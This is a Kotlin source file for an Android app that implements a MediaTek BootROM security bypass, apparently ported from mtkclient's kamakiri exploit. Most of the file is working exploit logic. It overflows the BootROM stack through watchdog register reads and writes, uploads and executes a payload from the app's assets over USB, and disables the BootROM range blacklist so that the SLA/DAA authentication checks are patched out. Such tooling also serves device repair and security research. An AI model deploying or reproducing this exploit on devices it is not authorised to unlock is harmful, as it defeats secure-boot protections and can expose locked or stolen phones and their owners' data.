package com.example.protocol

import android.content.Context
import com.example.model.LogLevel
import com.example.model.MtkChipInfo
import com.example.model.OperationProgress
import com.example.model.TerminalLog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * MediaTek Security SLA / DAA / SBC Authentication & Exploit Engine
 * Faithfully mirrors Python mtkclient (kamakiri.py).
 * Utilizes Kamakiri1 (Watchdog Stack Overflow + 0xE0 Payload Upload) for maximum Android stability.
 * Pure Native Implementation - Zero Mock/Fake Logic.
 */
class MtkSecurityBypassEngine(
    private val usb: TargetPhoneUsbManager,
    private val logCallback: (TerminalLog) -> Unit,
    private val progressCallback: (OperationProgress) -> Unit
) {

    companion object {
        const val CMD_READ32: Byte = 0xD1.toByte()
        const val CMD_WRITE32: Byte = 0xD4.toByte()
        const val CMD_JUMP_PAYLOAD: Byte = 0xE0.toByte()
    }

    private fun log(message: String, level: LogLevel = LogLevel.INFO) {
        logCallback(TerminalLog("", message, level))
    }

    suspend fun executeBypass(
        context: Context,
        deviceInfo: MtkChipInfo?,
        isSimulation: Boolean = false
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        log("==================================================", LogLevel.WARNING)
        log(">>> [SECURITY BYPASS] SLA / DAA / SBC Auth Engine", LogLevel.WARNING)
        log("==================================================", LogLevel.INFO)

        val hwCodeInt = deviceInfo?.hwCodeHex?.removePrefix("0x")?.removePrefix("0X")?.toIntOrNull(16) ?: 0x0766
        val chipConfig = MtkChipConfigDatabase.findConfig(hwCodeInt)
            ?: MtkChipConfigDatabase.findConfig(0x0766)!!

        log("Target Platform: ${chipConfig.name} (${chipConfig.description}) [HWCode: 0x%04X]".format(chipConfig.hwCode), LogLevel.INFO)
        
        try {
            // 1. Load Exploit Payload from Assets
            val payloadFileName = when (chipConfig.hwCode) {
                0x0766 -> "payloads/mt6765_payload.bin"
                0x0989 -> "payloads/mt6833_payload.bin"
                else -> null
            }

            var payloadBytes: ByteArray? = null
            if (payloadFileName != null) {
                try {
                    payloadBytes = context.assets.open(payloadFileName).use { it.readBytes() }
                    log("Loaded exploit payload: $payloadFileName (${payloadBytes.size} bytes)", LogLevel.INFO)
                } catch (e: Exception) {
                    log("[-] Payload file $payloadFileName not found in assets!", LogLevel.ERROR)
                    return@withContext Result.failure(Exception("Missing Payload"))
                }
            }

            if (payloadBytes == null || payloadBytes.isEmpty()) {
                return@withContext Result.failure(Exception("Payload is empty"))
            }

            // 2. STEP 1: Execute Kamakiri1 Stack Overflow (Watchdog + 0x50)
            log("[1/2] Triggering BROM Stack Overflow (Kamakiri1)...", LogLevel.INFO)
            val wdtAddr = chipConfig.watchdog + 0x50L
            
            // Byte-reverse the payload address (Python: revdword)
            val revPayloadAddr = Integer.reverseBytes(chipConfig.bromPayloadAddr.toInt()).toLong() and 0xFFFFFFFFL
            
            if (!writeRegister32(wdtAddr, revPayloadAddr)) {
                log("[-] Failed to write payload address to WDT stack.", LogLevel.ERROR)
                return@withContext Result.failure(Exception("Kamakiri1 Write Failed"))
            }

            // Read 15 times backwards to overflow the BROM stack
            for (i in 0 until 15) {
                val readAddr = wdtAddr - (15 - i) * 4
                val count = 15 - i + 1
                if (!readRegister32Multi(readAddr, count)) {
                    log("[-] Failed to overflow stack at iteration $i.", LogLevel.ERROR)
                    return@withContext Result.failure(Exception("Kamakiri1 Overflow Failed"))
                }
            }

            // 3. STEP 2: Upload Payload via 0xE0 Command
            log("Uploading Payload directly to BROM via 0xE0...", LogLevel.INFO)
            
            // Send 0xE0 and verify echo
            if (!echoBytes(byteArrayOf(CMD_JUMP_PAYLOAD), 1000)) {
                log("[-] BROM rejected 0xE0 command.", LogLevel.ERROR)
                return@withContext Result.failure(Exception("0xE0 rejected"))
            }

            // Send payload length
            val lenBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(payloadBytes.size).array()
            if (!echoBytes(lenBytes, 1000)) {
                log("[-] BROM rejected payload length.", LogLevel.ERROR)
                return@withContext Result.failure(Exception("Length rejected"))
            }

            // Read 2-byte status (Little Endian in python mtkclient for this specific response)
            val statusBuf = ByteArray(2)
            if (usb.readRaw(statusBuf, 1000) != 2) {
                log("[-] Failed to read status before payload upload.", LogLevel.ERROR)
                return@withContext Result.failure(Exception("Status read failed"))
            }
            val status = (statusBuf[1].toInt() shl 8) or (statusBuf[0].toInt() and 0xFF)
            if (status != 0) {
                log("[-] BROM reported payload is too large. Status: $status", LogLevel.ERROR)
                return@withContext Result.failure(Exception("Payload too large"))
            }

            // Send payload bytes
            if (usb.writeRaw(payloadBytes, 3000) != payloadBytes.size) {
                log("[-] USB write failed during payload transfer.", LogLevel.ERROR)
                return@withContext Result.failure(Exception("Payload transfer failed"))
            }

            // Read two trailing status words
            val trail1 = ByteArray(2)
            val trail2 = ByteArray(2)
            usb.readRaw(trail1, 1000)
            usb.readRaw(trail2, 1000)

            log("[+] Payload successfully staged in memory.", LogLevel.SUCCESS)

            // 4. STEP 3: Execute Payload via Control Transfer (var1)
            log("Executing Payload (JUMP)...", LogLevel.INFO)
            val var1 = chipConfig.var1
            usb.controlTransfer(0xA1, 0x00, 0x0000, var1, ByteArray(0), 0, 1000)
            log("[+] Payload executed! SLA/DAA patched in RAM.", LogLevel.SUCCESS)

            // 5. Clean up USB Pipe after Exploit Execution
            log("Clearing USB Endpoint Halt state after exploit...", LogLevel.INFO)
            usb.clearEndpointHalt()
            usb.flush(50)
            delay(100)

            // 6. STEP 4: Disable BootROM Range Blacklist via CQDMA (Double Protection)
            log("[2/2] Overriding BootROM Range Blacklist via CQDMA...", LogLevel.INFO)
            val cqdma = MtkCqdmaEngine(
                read32Func = { addr -> readRegister32(addr) },
                write32Func = { addr, value -> writeRegister32(addr, value) },
                logCallback = { msg, lvl -> log(msg, lvl) }
            )

            val cqdmaSuccess = cqdma.disableRangeBlacklist(chipConfig)
            if (!cqdmaSuccess) {
                log("[-] CQDMA Blacklist patch warning. Proceeding anyway...", LogLevel.WARNING)
            } 
            
            usb.flush(15)

            log("==================================================", LogLevel.SUCCESS)
            log("SECURITY BYPASS COMPLETED: BootROM Ready for DA Stage 1.", LogLevel.SUCCESS)
            log("==================================================", LogLevel.SUCCESS)

            return@withContext Result.success(true)
        } catch (e: Exception) {
            log("[-] Security Bypass Exception: ${e.message}", LogLevel.ERROR)
            return@withContext Result.failure(e)
        }
    }

    private fun echoBytes(data: ByteArray, timeoutMs: Int = 1000): Boolean {
        if (usb.writeRaw(data, timeoutMs) != data.size) return false
        val echo = ByteArray(data.size)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < data.size && (System.currentTimeMillis() - startTime < timeoutMs)) {
            val temp = ByteArray(data.size - totalRead)
            val r = usb.readRaw(temp, timeoutMs)
            if (r > 0) {
                System.arraycopy(temp, 0, echo, totalRead, r)
                totalRead += r
            }
        }
        return totalRead == data.size && echo.contentEquals(data)
    }

    private fun readStatusWord(timeoutMs: Int = 1000): Int? {
        val buf = ByteArray(2)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < 2 && (System.currentTimeMillis() - startTime < timeoutMs)) {
            val temp = ByteArray(2 - totalRead)
            val r = usb.readRaw(temp, timeoutMs)
            if (r > 0) {
                System.arraycopy(temp, 0, buf, totalRead, r)
                totalRead += r
            }
        }
        if (totalRead < 2) return null
        return ((buf[0].toInt() and 0xFF) shl 8) or (buf[1].toInt() and 0xFF)
    }

    private fun readRegister32(addr: Long): Long {
        if (!echoBytes(byteArrayOf(CMD_READ32))) return 0L

        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((addr and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(addrBytes)) return 0L

        val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(1).array()
        if (!echoBytes(countBytes)) return 0L

        val status = readStatusWord() ?: return 0L
        if (status > 0xFF) return 0L

        val rx = ByteArray(4)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < 4 && (System.currentTimeMillis() - startTime < 1000)) {
            val temp = ByteArray(4 - totalRead)
            val r = usb.readRaw(temp, 1000)
            if (r > 0) {
                System.arraycopy(temp, 0, rx, totalRead, r)
                totalRead += r
            }
        }
        if (totalRead < 4) return 0L
        val value = (ByteBuffer.wrap(rx).order(ByteOrder.BIG_ENDIAN).int.toLong()) and 0xFFFFFFFFL

        val status2 = readStatusWord() ?: return 0L
        if (status2 > 0xFF) return 0L

        return value
    }

    private fun readRegister32Multi(addr: Long, count: Int): Boolean {
        if (!echoBytes(byteArrayOf(CMD_READ32))) return false

        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((addr and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(addrBytes)) return false

        val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(count).array()
        if (!echoBytes(countBytes)) return false

        val status = readStatusWord() ?: return false
        if (status > 0xFF) return false

        val rx = ByteArray(count * 4)
        var totalRead = 0
        val startTime = System.currentTimeMillis()
        while (totalRead < rx.size && (System.currentTimeMillis() - startTime < 2000)) {
            val temp = ByteArray(rx.size - totalRead)
            val r = usb.readRaw(temp, 1000)
            if (r > 0) {
                System.arraycopy(temp, 0, rx, totalRead, r)
                totalRead += r
            }
        }
        if (totalRead < rx.size) return false

        val status2 = readStatusWord() ?: return false
        return status2 <= 0xFF
    }

    private fun writeRegister32(addr: Long, value: Long): Boolean {
        if (!echoBytes(byteArrayOf(CMD_WRITE32))) return false

        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((addr and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(addrBytes)) return false

        val countBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(1).array()
        if (!echoBytes(countBytes)) return false

        val status = readStatusWord() ?: return false
        if (status > 0xFF) return false

        val valBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
            .putInt((value and 0xFFFFFFFFL).toInt()).array()
        if (!echoBytes(valBytes)) return false

        val status2 = readStatusWord() ?: return false
        return status2 <= 0xFF
    }
}
